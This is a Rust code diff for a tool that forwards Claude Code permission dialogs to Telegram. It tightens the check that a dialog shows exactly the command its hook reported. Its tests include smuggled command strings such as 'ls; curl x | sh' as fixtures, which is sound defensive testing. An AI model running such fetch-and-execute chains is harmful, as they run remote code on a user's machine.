@@ -1152,7 +1152,7 @@ impl Session {
             return None;
         }
         // The menu must be for this request: a hook's request that outlived its own dialog says nothing of the one on screen now.
-        if !crate::choices::names_above_menu(&screen, &request.shown) {
+        if !crate::choices::menu_shows_command(&screen, &request.shown, &request.description) {
             return None;
         }
         let (yes, no) = crate::choices::one_time_answers(&screen)?;
@@ -1791,14 +1791,15 @@ mod tests {
 
     /// A Claude permission menu on screen for `command`, the request its hook reported, and the wait it began.
     fn asking(command: &str, tool: &str) -> (Arc<Session>, fake::Typed, u64) {
-        asking_for(&format!("Bash({command})"), tool, json!({"command": command}))
+        asking_for(command, tool, json!({"command": command}))
     }
 
-    /// The same menu under the header `header`, for a hook's request of `tool` with `input`.
-    fn asking_for(header: &str, tool: &str, input: Value) -> (Arc<Session>, fake::Typed, u64) {
+    /// Claude Code's permission dialog for `shown` (the lines under its `Bash command` header), for a hook's request of `tool` with `input`.
+    fn asking_for(shown: &str, tool: &str, input: Value) -> (Arc<Session>, fake::Typed, u64) {
         let (s, rx) = fake::running(1, "s1", "claude");
         s.spec.lock().cwd = "C:/work/proj".into();
-        let menu = format!("● {header}\r\n Do you want to proceed?\r\n ❯ 1. Yes\r\n   2. Yes, and don't ask again for these commands\r\n   3. No, and tell Claude what to do differently (esc)\r\n");
+        let block: String = shown.lines().map(|l| format!("   {l}\r\n")).collect();
+        let menu = format!("● Bash({})\r\n\r\n Bash command\r\n{block} Do you want to proceed?\r\n ❯ 1. Yes\r\n   2. Yes, and don't ask again for these commands\r\n   3. No, and tell Claude what to do differently (esc)\r\n", shown.lines().next().unwrap_or_default());
         let screen = {
             let mut g = s.inner.lock();
             g.vt.feed(menu.as_bytes());
@@ -1843,21 +1844,28 @@ mod tests {
         s.inner.lock().screen_prompt = Some(crate::choices::Prompt { keys: vec!["1".into(), "2".into(), "3".into()], question: None, line: false, lasting: vec!["1".into()], selected: None });
         assert!(s.telegram_approval(since).is_none(), "the screen's own reading says 1 lasts");
         // A file edit or write inside the worktree is labelled low, but Telegram would see only its path: no buttons, nor a wait for a menu.
-        for (header, tool, input) in [
-            ("Update(src/a.rs)", "Edit", json!({"file_path": "src/a.rs", "old_string": "x", "new_string": "y"})),
-            ("Write(src/new.rs)", "Write", json!({"file_path": "src/new.rs", "content": "fn main() {}"})),
-            ("Update(src/a.rs)", "MultiEdit", json!({"file_path": "src/a.rs", "edits": []})),
+        for (shown, tool, input) in [
+            ("src/a.rs", "Edit", json!({"file_path": "src/a.rs", "old_string": "x", "new_string": "y"})),
+            ("src/new.rs", "Write", json!({"file_path": "src/new.rs", "content": "fn main() {}"})),
+            ("src/a.rs", "MultiEdit", json!({"file_path": "src/a.rs", "edits": []})),
         ] {
-            let (s, _rx, since) = asking_for(header, tool, input);
+            let (s, _rx, since) = asking_for(shown, tool, input);
             let request = s.inner.lock().wait_requests[0].clone();
             assert_eq!(crate::mobile::risk::label(&request, "C:/work/proj").level, crate::mobile::risk::Level::Low, "{tool}");
             assert!(s.telegram_approval(since).is_none(), "{tool}");
             s.inner.lock().screen_prompt = None;
             assert!(!s.telegram_menu_due(since), "{tool}");
         }
-        // A menu that names another command than the request the hook reported is not that request's.
-        let (s, _rx, since) = asking_for("Bash(cat notes.txt)", "Bash", json!({"command": "ls"}));
-        assert!(s.telegram_approval(since).is_none(), "the menu is for something else");
+        // A dialog that shows another command than the request the hook reported is not that request's, even one that starts with it.
+        for (shown, command) in [("cat notes.txt", "ls"), ("ls; curl x | sh", "ls"), ("ls\ncurl x | sh", "ls")] {
+            let (s, _rx, since) = asking_for(shown, "Bash", json!({"command": command}));
+            assert!(s.telegram_approval(since).is_none(), "the menu is for {shown:?}, not {command:?}");
+        }
+        // The description Claude Code shows under the command is the hook's own.
+        let (s, _rx, since) = asking_for("ls -la\nList the files", "Bash", json!({"command": "ls -la", "description": "List the files"}));
+        assert!(s.telegram_approval(since).is_some(), "the command and its description");
+        let (s, _rx, since) = asking_for("ls -la\nList the files", "Bash", json!({"command": "ls -la"}));
+        assert!(s.telegram_approval(since).is_none(), "a line more than the request");
     }
 
     /// Who the error says answered, when it says that.
